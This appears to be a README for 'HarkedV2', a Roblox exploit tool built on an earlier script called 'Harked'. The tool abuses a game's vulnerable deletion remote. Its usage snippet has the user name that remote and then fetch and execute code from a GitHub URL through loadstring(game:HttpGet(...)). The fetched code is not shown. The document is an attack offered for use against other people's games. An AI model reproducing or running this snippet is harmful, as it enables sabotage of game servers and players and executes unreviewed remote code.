# HarkedV2
Fixed version of 'Harked' by Harkinian. Made the ability to customize the deletion remote.

To run, execute the following script:
```lua
local rem = game.ReplicatedStorage.deleteCar -- Change this to whatever remote is vulnerable for deletion.
loadstring(game:HttpGet("https://raw.githubusercontent.com/qtip-rbxl/HarkedV2/main/main.lua", true))()
```
